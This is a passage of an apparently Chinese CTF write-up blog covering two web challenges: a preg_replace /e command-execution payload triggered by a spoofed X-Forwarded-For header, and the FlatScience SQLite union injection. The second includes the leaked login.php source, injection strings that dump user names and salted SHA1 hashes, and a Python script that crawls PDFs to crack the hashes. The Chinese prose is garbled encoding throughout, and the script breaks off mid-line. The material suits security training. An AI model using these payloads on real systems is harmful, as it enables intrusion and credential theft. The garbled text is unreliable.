<p>è¿™ä¸€æ®µæ˜¯æœ€å…³é”®çš„ï¼Œæºç æ˜¾ç¤ºï¼Œå¦‚æœ<code>X_FORWARDED_FOR</code>æ˜¯127.0.0.1çš„è¯ï¼Œå°±ä¼šè§¦å‘ä¸‹é¢çš„ä»£ç é€»è¾‘ï¼Œæ¥å—3ä¸ªå‚æ•°è¿›è¡Œ<code>preg_replace()</code>å‡½æ•°çš„æ­£åˆ™æ›¿æ¢ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰å¯¹è¿™ä¸‰ä¸ªå‚æ•°åšå®‰å…¨æ ¡éªŒã€‚</p>
<p>åœ¨ä¹‹å‰çš„æ¼æ´å¤ç° <a target="_blank" rel="noopener" href="https://www.yyxzz.net/articles/59.html"><strong>CVE-2016-5734 - phpmyadminè¿œç¨‹ä»£ç æ‰§è¡Œ</strong></a> ä¸­å­¦ä¹ åˆ°ï¼Œ<code>preg_replace()</code>å‡½æ•°å½“æ­£åˆ™è¡¨è¾¾å¼çš„æ¨¡å¼æ˜¯<code>/e</code>æ—¶ï¼Œä¼šè¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œå…·ä½“å¯çœ‹ä¹‹å‰çš„æ¼æ´å¤ç°æ–‡ç« ä¸­çš„åˆ†æã€‚æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦å°†<code>X_FORWARDED_FOR</code>è®¾å®šä¸º127.0.0.1ï¼Œç„¶åæ„é€ payloadæ‰§è¡Œå‘½ä»¤è¯»å–flagå³å¯ã€‚</p>
<p>ä½¿ç”¨ModHeaderæ’ä»¶æ·»åŠ è¯·æ±‚å¤´ï¼Œè®¿é—®index.phpé¡µé¢å³å¯è§¦å‘å†…éƒ¨æµ‹è¯•é¡µé¢</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604393603.png" alt="1604247980550 (1).png"></p>
<p>æ„é€ å¦‚ä¸‹payloadï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pat=/(.)/e&amp;rep=system(<span class="string">&#x27;cat s3chahahaDir/flag/flag.php&#x27;</span>)&amp;sub=aaa</span><br></pre></td></tr></table></figure>
<p>flagçš„è·¯å¾„æ˜¯ä¸æ–­<code>ls -l</code>å‡ºæ¥çš„ï¼Œå‘é€å³å¯åŒ…å«è¯¥æ–‡ä»¶å¾—åˆ°Flag</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604393621.png" alt="1604248139499.png"></p>
<h3 id="å‚è€ƒ-2"><a href="#å‚è€ƒ-2" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php.php">https://www.php.net/manual/zh/wrappers.php.php</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/linuxsec/articles/12684259.html">https://www.cnblogs.com/linuxsec/articles/12684259.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/destiny1507/article/details/82347371">https://blog.csdn.net/destiny1507/article/details/82347371</a></p>
<h2 id="â­-FlatScienceï¼ˆSQLiteå›æ˜¾æ³¨å…¥-pythonè„šæœ¬å¯†ç ç¢°æ’ï¼‰"><a href="#â­-FlatScienceï¼ˆSQLiteå›æ˜¾æ³¨å…¥-pythonè„šæœ¬å¯†ç ç¢°æ’ï¼‰" class="headerlink" title="â­ FlatScienceï¼ˆSQLiteå›æ˜¾æ³¨å…¥+pythonè„šæœ¬å¯†ç ç¢°æ’ï¼‰"></a>â­ FlatScienceï¼ˆSQLiteå›æ˜¾æ³¨å…¥+pythonè„šæœ¬å¯†ç ç¢°æ’ï¼‰</h2><p>é¢˜ç›®æ¥æºï¼šHack.lu-2017</p>
<p>é¡µé¢æ˜¯ä¸€äº›é“¾æ¥ï¼Œç‚¹è¿›å»å…¨æ˜¯pdfæ–‡ä»¶ï¼Œæœ‰å¤šå±‚ç›®å½•åµŒå¥—ï¼Œæ²¡æœ‰å‘ç°å¯ç–‘ç‚¹</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604395488.png" alt="1604305384872.png"></p>
<p>Dirbæ‰«æå‘ç°äº†robots.txtæ–‡ä»¶ï¼Œå¾—åˆ°ä¸¤ä¸ªè·¯å¾„ï¼šlogin.phpå’Œadmin.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;login.php</span><br><span class="line">Disallow: &#x2F;admin.php</span><br></pre></td></tr></table></figure>
<p>admin.phpæç¤ºéœ€è¦adminè´¦æˆ·ç™»å½•ï¼Œå°è¯•SQLæ³¨å…¥å’Œç™»å½•ç»•è¿‡éƒ½å¤±è´¥äº†ï¼ŒåŸç å¤„æ³¨é‡Š<code>&lt;!-- do not even try to bypass this --&gt;</code>ï¼Œçœ‹æ¥è¡Œä¸é€šï¼Œæš‚æ—¶æ”¾ä¸‹</p>
<p>åœ¨login.phpä¸­çš„usrå‚æ•°å‘ç°äº†SQLæ³¨å…¥æ¼æ´ï¼Œä½¿ç”¨å•å¼•å·åˆ¶é€ æŠ¥é”™ï¼Œå¾—åˆ°æ•°æ®åº“ç±»å‹SQLiteä»¥åŠç½‘ç«™æ ¹ç›®å½•<code>/var/www/html</code></p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604395499.png" alt="1604305624026.png"></p>
<p>è€Œä¸”åœ¨æœ¬é¡µé¢çš„æºç å¤„ä¹Ÿå‘ç°äº†æ³¨é‡Šæç¤ºï¼š<code>&lt;!-- TODO: Remove ?debug-Parameter! --&gt;</code>ï¼Œæ„æ€æ˜¯è¦**?debug<strong>å—ï¼Œurlåè¾“å…¥</strong>?debug**æœç„¶é¡µé¢ç»™å‡ºäº†login.phpæºç ï¼Œæˆªå–éƒ¨åˆ†å…³é”®çš„phpä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;usr&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pw&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;usr&#x27;</span>];</span><br><span class="line">        <span class="variable">$pass</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pw&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$db</span> = <span class="keyword">new</span> SQLite3(<span class="string">&#x27;../fancy.db&#x27;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$db</span>-&gt;query(<span class="string">&quot;SELECT id,name from Users where name=&#x27;&quot;</span>.<span class="variable">$user</span>.<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.sha1(<span class="variable">$pass</span>.<span class="string">&quot;Salz!&quot;</span>).<span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$res</span>-&gt;fetchArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;Some Error occourred!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">            setcookie(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27; &#x27;</span>.<span class="variable">$row</span>[<span class="string">&#x27;name&#x27;</span>], time() + <span class="number">60</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">            header(<span class="string">&quot;Location: /&quot;</span>);</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;debug&#x27;</span>]))</span><br><span class="line">highlight_file(<span class="string">&#x27;login.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>å®¡è®¡ç»“æœï¼š</strong></p>
<ul>
<li>ç¬¬8è¡Œçš„SQLæŸ¥è¯¢è¯­å¥çš„ç¡®å­˜åœ¨æ³¨å…¥ï¼Œæœ‰nameå’Œpasswordå­—æ®µï¼Œå­˜å‚¨çš„passwordä¸ºæ‹¼æ¥å¹¶åšSHA1çš„ç»“æœ</li>
<li>å­˜åœ¨idå‚æ•°ï¼Œåˆ©ç”¨æŸ¥è¯¢ç»“æœç”ŸæˆCookieï¼Œæ­¤å¤„ä¼šäº§ç”Ÿå›æ˜¾</li>
<li>GETä¼ å‚debugæ—¶ï¼Œä¼šè¾“å‡ºlogin.phpæºç </li>
</ul>
<p>æ‰€ä»¥æ€è·¯å°±æ¯”è¾ƒæ˜ç¡®äº†ï¼Œåˆ©ç”¨SQLæ³¨å…¥ï¼ŒæŸ¥è¯¢adminè´¦æˆ·çš„å¯†ç ç„¶åç ´è§£æˆ–ç¢°æ’ã€‚</p>
<p><strong>æ³¨å…¥è¿‡ç¨‹ï¼š</strong></p>
<p>æ ¹æ®å®¡è®¡ç»“æœï¼Œæµ‹è¯•æ˜¯å¦ä¼šæœ‰æ³¨å…¥å›æ˜¾ï¼Œå½“æŸ¥è¯¢åˆ°ç»“æœæ—¶ï¼Œå°±ä¼šè®¾å®šCookieï¼Œä»¥å­˜åœ¨çš„adminç”¨æˆ·ä¸ºä¾‹</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604395530.png" alt="1604306380187.png"></p>
<p>é€šè¿‡æ˜¯å¦æœ‰Set-Cookieå­—æ®µï¼Œè¿›è¡Œorder byå’Œunion selectè”åˆæŸ¥è¯¢ï¼Œå¾—åˆ°å›æ˜¾ç‚¹æ˜¯åœ¨æŸ¥è¯¢ç»“æœçš„ç¬¬2ä¸ªå­—æ®µ</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604395538.png" alt="1604306542142.png"></p>
<p>SQLiteæ•°æ®åº“ä¸­ï¼Œå­˜åœ¨ä¸€ä¸ªsqlite_masteré»˜è®¤è¡¨ï¼Œç±»ä¼¼äºmysqlä¸­çš„information_schemaï¼Œå¯ä»¥åœ¨sqlite_masterä¸­æŸ¥è¯¢æ‰€æœ‰çš„è¡¨æ˜ä»¥åŠä¹‹å‰æ‰§è¡Œè¿‡çš„åˆ›å»ºè¡¨çš„sqlè¯­å¥ï¼Œå…·ä½“ï¼š</p>
<blockquote>
<p><strong>sqlite_master</strong> è¡¨æ˜¯ SQLite çš„ç³»ç»Ÿè¡¨ã€‚è¯¥è¡¨è®°å½•è¯¥æ•°æ®åº“ä¸­ä¿å­˜çš„è¡¨ã€ç´¢å¼•ã€è§†å›¾ã€å’Œè§¦å‘å™¨ä¿¡æ¯ã€‚æ¯ä¸€è¡Œè®°å½•ä¸€ä¸ªé¡¹ç›®ã€‚åœ¨åˆ›å»ºä¸€ä¸ª SQLIite æ•°æ®åº“çš„æ—¶å€™ï¼Œè¯¥è¡¨ä¼šè‡ªåŠ¨åˆ›å»ºã€‚sqlite_master è¡¨<strong>åŒ…å«5åˆ—</strong>ã€‚</p>
<p><strong>type</strong>ï¼šè®°å½•äº†é¡¹ç›®çš„ç±»å‹ï¼Œå¦‚ tableã€indexã€viewã€trigger ã€‚</p>
<p><strong>name</strong>ï¼šè®°å½•äº†é¡¹ç›®çš„åç§°ï¼Œå¦‚è¡¨åã€ç´¢å¼•åç­‰ã€‚</p>
<p><strong>tbl_name</strong>ï¼šè®°å½•æ‰€ä»å±çš„è¡¨åï¼Œå¦‚ç´¢å¼•æ‰€åœ¨çš„è¡¨åã€‚å¯¹äºè¡¨æ¥è¯´ï¼Œè¯¥åˆ—å°±æ˜¯è¡¨åæœ¬èº«ã€‚</p>
<p><strong>rootpage</strong>ï¼šè®°å½•é¡¹ç›®åœ¨æ•°æ®åº“é¡µä¸­å­˜å‚¨çš„ç¼–å·ã€‚å¯¹äºè§†å›¾å’Œè§¦å‘å™¨ï¼Œè¯¥åˆ—å€¼ä¸º0æˆ–è€… NULL ã€‚</p>
<p><strong>sql</strong>ï¼šè®°å½•åˆ›å»ºè¯¥é¡¹ç›®çš„ SQL è¯­å¥ã€‚</p>
</blockquote>
<p>æ‰€ä»¥å¯æ„é€ çš„SQLè¯­å¥å¦‚ä¸‹ï¼š</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> tbl_name <span class="keyword">from</span> sqlite_master <span class="comment">-- æŸ¥è¯¢è¡¨å</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">sql</span> <span class="keyword">from</span> sqlite_master <span class="comment">-- æŸ¥è¯¢æ‰§è¡Œè¿‡çš„sqlè¯­å¥</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">sql</span> <span class="keyword">from</span> sqlite_master <span class="keyword">where</span> type<span class="operator">=</span><span class="string">&#x27;table&#x27;</span> <span class="keyword">and</span> tbl_name<span class="operator">=</span><span class="string">&#x27;Users&#x27;</span> <span class="comment">-- æŸ¥è¯¢åˆ›å»ºUserè¡¨çš„SQLè¯­å¥</span></span><br></pre></td></tr></table></figure>
<p>è¿™æ ·çš„è¯ï¼Œå°±å¯ä»¥åˆ©ç”¨limitå­å¥ï¼Œé€ä¸ªæŸ¥è¯¢è¡¨åï¼Œå†é€šè¿‡æŸ¥è¯¢åˆ›å»ºè¯¥è¡¨çš„sqlè¯­å¥å¾—åˆ°å…¶å­—æ®µä¿¡æ¯ï¼Œå·²ç»æŸ¥åˆ°äº†å­˜åœ¨Usersè¡¨ï¼ŒæŸ¥è¯¢å…¶å­—æ®µä¿¡æ¯ï¼š</p>
<p>payloadï¼š</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?usr<span class="operator">=</span><span class="string">&#x27;union select 1,sql from sqlite_master where type=&#x27;</span><span class="keyword">table</span><span class="string">&#x27; and tbl_name=&#x27;</span>Users<span class="string">&#x27; --+&amp;pw=aa&amp;id=1</span></span><br></pre></td></tr></table></figure>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604395559.png" alt="1604307079546.png"></p>
<p>å¾—åˆ°4ä¸ªå­—æ®µï¼šidã€nameã€passwordã€hint</p>
<p>åˆ©ç”¨èšåˆå‡½æ•°<code>group_concat()</code>åˆ†åˆ«æŸ¥è¯¢nameã€passwordå’Œhint</p>
<p>payloadï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?usr=&#x27; union select 1,group_concat(name,&quot;----&quot;) from Users --+&amp;pw=aa&amp;id=1</span><br><span class="line">?usr=&#x27; union select 1,group_concat(password,&quot;----&quot;) from Users --+&amp;pw=aa&amp;id=1</span><br><span class="line">?usr=&#x27; union select 1,group_concat(hint,&quot;----&quot;) from Users --+&amp;pw=aa&amp;id=1</span><br></pre></td></tr></table></figure>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604395567.png" alt="1604307326795.png"></p>
<p>ç»Ÿè®¡æŸ¥åˆ°çš„æ•°æ®ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">name:  admin</span><br><span class="line">password:  34b0bb7c304949f9ff2fc101eef0f048be10d3bd</span><br><span class="line">hint:  my+fav+word+in+my+fav+paper%3F%21</span><br><span class="line"></span><br><span class="line">fritze</span><br><span class="line">3fab54a50e770d830c0416df817567662a9dc85c</span><br><span class="line">my+love+is%E2%80%A6%3F</span><br><span class="line"></span><br><span class="line">hansi</span><br><span class="line">54eae8935c90f467427f05e4ece82cf569f89507</span><br><span class="line">the+password+is+password</span><br></pre></td></tr></table></figure>
<p>å› ä¸ºå¯†ç çš„æ•£åˆ—å€¼æ˜¯åŠ ç›çš„ï¼Œæ‰€ä»¥ç½‘ä¸Šç ´è§£ä¸å‡ºæ¥ï¼Œå†™äº†ä¸€ä¸ªPythonè„šæœ¬å¯¹å¸¸ç”¨çš„2ä¸‡ä¸ªå¯†ç åŒæ ·åŠ ç›åšSHA1æ•£åˆ—è¿›è¡Œç¢°æ’ï¼Œæ²¡æœ‰å¾—åˆ°ç»“æœã€‚</p>
<p>hintæç¤ºå¯†ç å°±åœ¨é‚£äº›pdfä¸­ï¼Œå¯¹<code>%E2%80%A6%3F</code>åšURLè§£ç åé€ä¸ªpdfæŸ¥è¯¢ä¹Ÿæ²¡æœ‰å¾—åˆ°ç»“æœã€‚æ‡µäº†ï¼Œæ²¡åŠæ³•ï¼Œçœ‹ä¸€ä¸‹å¸ˆå‚…ä»¬çš„wpå§ï¼Œå¾—çŸ¥éœ€è¦çˆ¬å–æ‰€æœ‰PDFï¼Œå¯¹å…¶ä¸­çš„å•è¯è¿›è¡ŒåŠ ç›SHA1åšç¢°æ’æµ‹è¯•ã€‚</p>
<p>OKï¼Œè‡ªå·±æ’¸ä»£ç å§ï¼Œä¸ç”¨å¸ˆå‚…ä»¬å†™å¥½çš„äº†ï¼Œæ¯•ç«Ÿä¹Ÿæ˜¯å­¦äº†ä¸€æ®µæ—¶é—´Pythonçš„ï¼Œè€Œä¸”ä¹‹å‰ç»™å¥³ç›†å‹å†™è‹±æ–‡PDFç¿»è¯‘å·¥å…·æ—¶å·²ç»æœ‰ä¸€äº›è½®å­äº†ï¼Œç›´æ¥æ‹¿æ¥ç”¨å§ï¼ˆå°å£°bbï¼šç»™å°é»‘åŒå­¦çš„ç¿»è¯‘å·¥å…·åˆ°ç°åœ¨è¿˜æ²¡å†™å¥½ï¼Œæ²¡æœ‰æ‰¾åˆ°åˆé€‚çš„ç¿»è¯‘apiï¼‰</p>
<p>å¤§æ¦‚èŠ±äº†1ä¸ªåŠä¸ªå°æ—¶å†™å®Œã€‚ã€‚ã€‚å¤ªæ…¢äº†ğŸ˜“</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3.7</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : Cr4y0n</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Time    : 2020/11/2 17:26</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfparser <span class="keyword">import</span> PDFParser</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfdocument <span class="keyword">import</span> PDFDocument</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfpage <span class="keyword">import</span> PDFPage</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfpage <span class="keyword">import</span> PDFTextExtractionNotAllowed</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfinterp <span class="keyword">import</span> PDFResourceManager</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfinterp <span class="keyword">import</span> PDFPageInterpreter</span><br><span class="line"><span class="keyword">from</span> pdfminer.layout <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pdfminer.converter <span class="keyword">import</span> PDFPageAggregator</span><br><span class="line"></span><br><span class="line"><span class="comment"># åœ¨é¡µé¢é€’å½’æŸ¥æ‰¾pdfæ–‡ä»¶</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findPDF</span>(<span class="params">url</span>):</span></span><br><span class="line">    re_pdf = <span class="string">&quot;[a-fA-F0-9]&#123;32&#125;.pdf&quot;</span></span><br><span class="line">    re_index = <span class="string">&quot;[0-9\/]&#123;1,5&#125;index.html&quot;</span></span><br><span class="line">    <span class="keyword">global</span> pdfList</span><br><span class="line">    rep = requests.get(url).text</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> re.findall(re_pdf, rep):</span><br><span class="line">        pdfURL = url + i</span><br><span class="line">        pdfUrlList.append(pdfURL)</span><br><span class="line">        print(<span class="string">&quot;PDFï¼š&quot;</span>, pdfURL)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> re.findall(re_index, rep):</span><br><span class="line">        newURL = url + i[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">        findPDF(newURL)</span><br><span class="line"><span class="comment"># ä¸‹è½½pdfæ–‡ä»¶</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">downloadFile</span>(<span class="params">urlList</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(<span class="string">&quot;pdf&quot;</span>):</span><br><span class="line">        os.mkdir(<span class="string">&quot;pdf&quot;</span>)</span><br><span class="line">    os.chdir(<span class="string">&quot;./pdf&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urlList:</span><br><span class="line">        os.system(<span class="string">&quot;curl -O &quot;</span> + url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è½¬æ¢ä¸ºtxt</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Pdf2Text</span>(<span class="params">path</span>):</span></span><br><span class="line">    <span class="comment"># æ‰“å¼€PDFæ–‡ä»¶</span></span><br><span class="line">    pdfFile = <span class="built_in">open</span>(path, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">    <span class="comment"># åˆ›å»ºpdfæ–‡æ¡£åˆ†æå™¨</span></span><br><span class="line">    parser = PDFParser(pdfFile)</span><br><span class="line">    <span class="comment"># åˆ›å»ºPDFæ–‡æ¡£å¯¹è±¡å­˜å‚¨æ–‡æ¡£ç»“æ„</span></span><br><span class="line">    document = PDFDocument(parser)</span><br><span class="line">    <span class="comment"># æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å…è®¸æ–‡æœ¬æå–</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> document.is_extractable:</span><br><span class="line">        <span class="keyword">raise</span> PDFTextExtractionNotAllowed</span><br><span class="line">    <span class="comment"># åˆ›å»ºPDFèµ„æºç®¡ç†å™¨å¯¹è±¡æ¥å­˜å‚¨å…±äº«èµ„æº</span></span><br><span class="line">    resource = PDFResourceManager()</span><br><span class="line">    <span class="comment"># è®¾å®šå‚æ•°è¿›è¡Œåˆ†æ</span></span><br><span class="line">    laparams = LAParams()</span><br><span class="line">    <span class="comment"># åˆ›å»ºä¸€ä¸ªPDFè®¾å¤‡å¯¹è±¡</span></span><br><span class="line">    device = PDFPageAggregator(resource, laparams=laparams)</span><br><span class="line">    <span class="comment"># åˆ›å»ºä¸€ä¸ªPDFè§£é‡Šå™¨å¯¹è±¡</span></span><br><span class="line">    interpreter = PDFPageInterpreter(resource, device)</span><br><span class="line">    <span class="comment"># åˆ›å»ºå­˜å‚¨è½¬æ¢ç»“æœçš„åŒåtxtæ–‡ä»¶</span></span><br><span class="line">    fileName = <span class="built_in">str</span>(os.path.abspath(path).split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>])</span><br><span class="line">    newFileName = fileName + <span class="string">&quot;.txt&quot;</span></span><br><span class="line">    f = <span class="built_in">open</span>(newFileName, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">    <span class="comment"># å¤„ç†æ¯ä¸€é¡µ</span></span><br><span class="line">    <span class="keyword">for</span> page <span class="keyword">in</span> PDFPage.create_pages(document):</span><br><span class="line">        interpreter.process_page(page)</span><br><span class="line">        <span class="comment"># æ¥å—è¯¥é¡µé¢çš„LTPageå¯¹è±¡</span></span><br><span class="line">        layout = device.get_result()</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> layout:</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">isinstance</span>(x, LTTextBoxHorizontal)):</span><br><span class="line">                <span class="comment"># å†™å…¥txtæ–‡ä»¶</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    f.writelines(x.get_text() + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># é€ä¸ªå•è¯è¿›è¡Œæ•£åˆ—è¿ç®—å¹¶æŸ¥æ‰¾åŒ¹é…</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findPassword</span>(<span class="params">path</span>):</span></span><br><span class="line">    ls = [<span class="string">&quot;34b0bb7c304949f9ff2fc101eef0f048be10d3bd&quot;</span>, <span class="string">&quot;3fab54a50e770d830c0416df817567662a9dc85c&quot;</span>, <span class="string">&quot;54eae8935c90f467427f05e4ece82cf569f89507&quot;</span>]</span><br><span class="line">    wordList = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">            i = i.strip()</span><br><span class="line">            lineWordList = <span class="built_in">list</span>(i.split())</span><br><span class="line">            wordList += lineWordList</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> wordList:</span><br><span class="line">        i = i.strip(<span class="string">&quot;:&quot;</span>).strip(<span class="string">&quot;;&quot;</span>).strip(<span class="string">&quot;.&quot;</span>).strip(<span class="string">&quot;?&quot;</span>)</span><br><span class="line">        en = sha1()</span><br><span class="line">        en.update((i + <span class="string">&quot;Salz!&quot;</span>).encode(<span class="string">&quot;utf8&quot;</span>))</span><br><span class="line">        result = en.hexdigest()</span><br><span class="line">        <span class="keyword">if</span> result 